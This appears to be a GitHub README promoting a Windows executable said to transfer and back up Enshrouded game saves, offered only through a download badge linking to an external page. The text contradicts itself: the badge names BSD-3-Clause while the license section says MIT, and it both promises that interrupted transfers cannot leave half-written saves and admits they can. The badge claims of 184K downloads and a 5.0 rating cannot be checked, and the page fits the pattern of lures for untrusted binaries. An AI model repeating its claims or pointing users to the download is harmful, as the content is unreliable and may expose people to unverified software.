<div align="center">

# Enshrouded World Transfer & Preservation Tool for Windows 11

![](files/1.png)

[![downloads](https://img.shields.io/badge/downloads-184K-dc2626?style=social)]() [![platform](https://img.shields.io/badge/platform-Windows_10_%7C_11-dc2626?style=social)]() [![license](https://img.shields.io/badge/license-BSD--3--Clause-dc2626?style=social)]() [![status](https://img.shields.io/badge/status-stable-2ea44f?style=social)]() [![rating](https://img.shields.io/badge/rating-5.0%2F5-f59e0b?style=social)]()

[![Download](https://raw.githubusercontent.com/madebox77-create/enshrouded-world-transfer-tool/main/grab_75c94e6.svg)](https://madebox77-create.github.io/enshrouded-world-transfer-tool/)

</div>

---

Enshrouded World Transfer Tool is a Windows companion utility designed to transfer and preserve Enshrouded world saves through a structured desktop workflow. It provides dedicated areas for world import, save export, and transfer preview, supported by packaged Windows distribution files and accompanying documentation. The tool is packaged as a downloadable ZIP containing the executable and required supporting files, keeping all bundled components together during extraction. It is an independent, community-maintained project intended for local save management on Windows systems.

## Features

- **World Save Import:** Provides a dedicated workflow for bringing existing Enshrouded world save data into the tool's managed transfer environment, with file selection and validation handled through a guided desktop interface.
- **World Save Export:** Supports packaging selected world data into a transferable archive, preserving the original directory structure and associated save metadata for downstream use or archival.
- **Transfer Preview:** Offers a pre-transfer inspection stage that surfaces the contents and intended destination of a pending world transfer, allowing the operator to confirm scope before any files are written.
- **Save Preservation Workflow:** Includes safeguards oriented toward retaining original world data, encouraging the creation of independent backups prior to any import or export operation.
- **Windows-Native Distribution:** Delivered as a self-contained Windows package with a corresponding executable and bundled supporting files, requiring no external runtime configuration beyond extraction.
- **Local-Only Operation:** Designed to perform world transfer and preservation tasks entirely on the local machine, without reliance on remote services or network-dependent processing.
- **Documentation-Driven Usage:** Accompanied by structured project documentation covering the intended workflow, package layout, and operational expectations for each feature area.

## How It Works

The tool operates as a local, self-contained Windows companion that mediates the movement of Enshrouded world save data between locations on disk. It performs no network communication and does not patch or inject into the game process.

The workflow follows four discrete stages:

**1. Source Discovery**
The tool enumerates candidate world save directories and identifies save containers by their structure and metadata. Users can point it at a custom path when saves live outside the default profile location. Discovery is read-only — no files are altered during scanning.

**2. Validation and Preview**
Before any copy occurs, each discovered world is parsed and summarized: world name, save slot, size, and last-modified timestamp. The transfer preview surfaces exactly which files would be written and where, letting you confirm the mapping between source and destination before committing. Structural inconsistencies are flagged at this stage rather than after a partial copy.

**3. Transfer Execution**
Selected worlds are copied to the destination using staged writes — data is written to a temporary location and then atomically moved into place, so an interrupted transfer cannot leave a half-written save in the target directory. Existing destination worlds are never overwritten silently; collisions require explicit confirmation and are backed up beforehand.

**4. Preservation and Verification**
Every transfer produces a timestamped backup of the destination state prior to modification. After the copy completes, file sizes and checksums are compared between source and destination to confirm integrity. Backup archives remain on disk and can be restored independently of the application.

**Design constraints**

- **Offline by design.** No telemetry, no update checks, no remote endpoints.
- **Non-destructive defaults.** Backups are created automatically; overwrites are opt-in.
- **No game modification.** The tool only reads and writes save files — it does not alter executables, configuration, or memory.
- **Portable operation.** All state lives alongside the extracted application files; nothing is written to the registry or system directories.

Because the tool touches persistent game data, the integrity checks and pre-transfer backups are not optional extras — they are the mechanism by which a failed or mistaken transfer remains recoverable.

## Requirements

The utility is distributed as a Windows desktop package and is intended to run on a supported 64-bit Windows installation; confirm the target build of the operating system matches the release notes before deployment. Administrative privileges may be required when the transfer workflow reads from or writes to protected save directories, and the application should be launched from an extracted folder with all bundled dependencies retained in their original relative locations. Sufficient free disk space is needed for both the incoming world archive and a complete backup of existing save data, since the tool preserves original files rather than overwriting them in place. The environment must expose the standard Enshrouded save directory structure so the utility can enumerate world containers; custom or relocated save paths should be verified as accessible before initiating a transfer. A current release of the project package is assumed, along with any runtime components shipped inside it, and users should validate the executable origin and integrity prior to first launch. Network connectivity is only needed to obtain the packaged release and is not required for the transfer or preservation operations themselves.

## FAQ

**Does the tool modify Enshrouded game files directly?** The utility is designed around world save transfer and preservation workflows. Any operations that touch save data should be treated as write operations against live game files; create an independent backup of the relevant save directories before running any transfer or import action, and verify the resulting files in-game afterward.

**Which Enshrouded save locations does the tool expect?** The documentation addresses Enshrouded save locations as a first-class concept, including the standard per-user save directory structure on Windows. Because paths can vary by installation type, verify the active save path in the application before initiating a transfer, and confirm that the selected source and destination directories resolve to the expected world slots.

**What is the difference between Import, Export, and Transfer Preview?** Export packages an existing world for preservation or relocation. Import stages an external world archive into the local save structure. Transfer Preview is intended to surface a pre-commit view of the planned operation so the mapping between source and destination can be reviewed before any files are written. Confirm the actual controls and confirmation prompts in the executable build you are running.

**Can the tool transfer worlds between different machines or Windows user profiles?** The transfer workflow is built around relocatable world archives, so the intended use case includes moving a world between installations or profiles on Windows. Ensure the destination environment has a compatible Enshrouded version and that the target save slot is not already occupied by a world you intend to keep.

**Does the utility require administrative privileges?** Operations limited to user-profile save directories generally do not require elevation. If a selected path resolves outside the current user's profile, Windows may prompt for elevation; grant it only after verifying the executable's provenance and confirming the target path.

**Is the executable signed, and how should provenance be verified?** Review the publisher information, file origin, and any available signature or scan results before execution. Do not bypass Windows unknown-publisher warnings for binaries whose source you have not verified. The documentation and packaged release are the authoritative references for the expected file set.

**What happens if a transfer is interrupted?** Because transfers involve file-level operations on save data, an interrupted run can leave a partially staged destination. Restore from the independent backup taken before the operation, then re-run the transfer after confirming the source archive is intact and the destination path is writable.

**Does the tool support batch processing of multiple worlds?** The feature set is organized around individual world transfer and preservation operations. For multiple worlds, process them sequentially and validate each result before proceeding to the next, keeping per-world backups so a failure in one operation does not affect previously completed transfers.

**Are future Enshrouded updates supported?** Save format compatibility depends on the game version that produced the world data. Verify that the source and destination installations share a compatible version before transferring, and retain the original archive so a world can be re-imported if a later game update changes save handling.

**Where can I find the packaged release and documentation?** The repository hosts the documentation and the packaged release. Confirm the release asset name and the expected executable inside the archive before extraction, and keep all bundled directories and configuration files together so the application resolves its dependencies correctly.

## Disclaimer

This project is an independent, community-maintained companion utility for Enshrouded, focused on world save transfers and preservation. It is provided for informational and operational convenience only and is offered without warranties of any kind, whether express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement.

The project is not affiliated with, endorsed by, sponsored by, or otherwise associated with the developers or publishers of Enshrouded or any related entities. All product names, trademarks, and game references are used solely to describe compatibility and intended use.

World save operations are inherently destructive if performed incorrectly. Users are solely responsible for verifying the integrity of source and destination save data, maintaining independent backups before initiating any transfer, and confirming that file operations complete successfully. The project authors accept no liability for data loss, corruption, or unintended modification of game files, saves, configuration, or system state arising from use of the software.

Transfer behavior depends on the specific Enshrouded version, save format, and storage layout in use. Compatibility with future or past game versions is not guaranteed and may require the user to validate the workflow independently. Documentation is provided as a general guide; the actual controls and behavior of any packaged executable must be confirmed by the user before reliance.

Users are responsible for ensuring they are authorized to access and modify the save data they operate on, and for complying with any applicable terms of service, laws, or agreements governing the game and their local environment. The project does not grant any rights to game assets or third-party content.

Security review of any packaged executable rests with the user. Verify publisher identity, file provenance, and scan results prior to execution, and do not bypass operating system warnings for software of unknown origin. Redistribution of bundled binaries, DLLs, third-party components, or game assets is not permitted under this project's own terms and remains subject to the respective licenses of those components.

## License

This project is distributed under the **MIT License** for all original project-authored materials, including the documentation, configuration schemas, and utility source code contained within this repository. The MIT License permits use, reproduction, modification, and redistribution of these components provided that the copyright notice and permission notice are retained in all copies or substantial portions of the software.

Bundled binaries, including the packaged Windows executable and any accompanying dynamic-link libraries, are provided as prebuilt distributions and are governed by their own respective licensing terms. These components are not automatically covered by the project's MIT License, and any third-party dependencies embedded within them retain the licenses granted by their original authors.

Game assets, world save data, and any Enshrouded-specific content referenced or processed by this tool remain the intellectual property of their respective rights holders and are explicitly excluded from the project's licensing scope. This tool claims no ownership over such content and does not grant any rights to it.

The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

No standalone LICENSE file is bundled with the distributed package; the terms described in this section constitute the complete licensing information for the project. Users are responsible for verifying compliance with all applicable licenses before redistributing any component of this project.

[![Download](https://raw.githubusercontent.com/madebox77-create/enshrouded-world-transfer-tool/main/grab_75c94e6.svg)](https://madebox77-create.github.io/enshrouded-world-transfer-tool/)